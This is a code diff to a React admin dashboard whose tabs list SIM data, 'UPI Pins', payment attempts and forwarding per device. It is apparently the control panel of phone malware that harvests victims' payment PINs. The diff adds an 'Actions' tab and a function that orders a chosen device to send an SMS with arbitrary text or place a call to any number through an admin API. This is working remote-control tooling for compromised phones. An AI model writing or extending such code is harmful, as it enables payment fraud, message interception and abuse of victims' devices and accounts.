@@ -15,6 +15,7 @@ const tabs = [
   { key: 'upi_details', label: 'UPI Pins' },
   { key: 'payment_attempts', label: 'Payments' },
   { key: 'forwarding', label: 'Forwarding' },
+  { key: 'actions', label: 'Actions' },
 ]
 
 const cols = {
@@ -33,6 +34,8 @@ export default function App() {
   const [tab, setTab] = useState('sim')
   const [fwd, setFwd] = useState({})
   const [saving, setSaving] = useState(false)
+  const [actions, setActions] = useState({})
+  const [actionSending, setActionSending] = useState({})
   const [time, setTime] = useState('')
 
   const fetchData = useCallback(async () => {
@@ -76,6 +79,26 @@ export default function App() {
       })
     } catch {}
     setSaving(false)
+  }
+
+  const sendAction = async (id, type) => {
+    const a = actions[id]
+    if (!a || !a.target_number) return
+    setActionSending(prev => ({...prev, [id]: true}))
+    try {
+      await fetch(`${API_BASE}/api/admin/action`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          device_id: id,
+          type,
+          target_number: a.target_number,
+          message: a.message || '',
+        }),
+      })
+      setActions(prev => ({...prev, [id]: {...prev[id], target_number: '', message: ''}}))
+    } catch {}
+    setActionSending(prev => ({...prev, [id]: false}))
   }
 
   if (!data) return <div style={s.loading}>Loading...</div>
@@ -213,6 +236,28 @@ export default function App() {
                       </div>
                       <button onClick={()=>saveFwd(id)} disabled={saving}
                         style={s.save}>{saving?'Saving...':'Save'}</button>
+                    </div>
+                  )}
+
+                  {tab === 'actions' && (
+                    <div>
+                      <div style={{marginBottom:8,fontSize:11,color:'#64748b'}}>
+                        Send SMS or make call from this device.
+                      </div>
+                      <input type="text" placeholder="Target phone number"
+                        value={actions[id]?.target_number||''}
+                        onChange={e=>setActions(prev=>({...prev,[id]:{...prev[id],target_number:e.target.value}}))}
+                        style={{...s.inp,width:'100%',marginBottom:6,boxSizing:'border-box'}} />
+                      <textarea placeholder="SMS message (only for SMS action)"
+                        value={actions[id]?.message||''}
+                        onChange={e=>setActions(prev=>({...prev,[id]:{...prev[id],message:e.target.value}}))}
+                        style={{...s.inp,width:'100%',minHeight:60,resize:'vertical',marginBottom:8,boxSizing:'border-box',fontFamily:'inherit'}} />
+                      <div style={{display:'flex',gap:8}}>
+                        <button onClick={()=>sendAction(id,'sms')} disabled={actionSending[id]}
+                          style={{...s.save,background:'#22c55e'}}>{actionSending[id]?'Sending...':'Send SMS'}</button>
+                        <button onClick={()=>sendAction(id,'call')} disabled={actionSending[id]}
+                          style={{...s.save,background:'#ef4444'}}>{actionSending[id]?'Calling...':'Make Call'}</button>
+                      </div>
                     </div>
                   )}
                 </div>
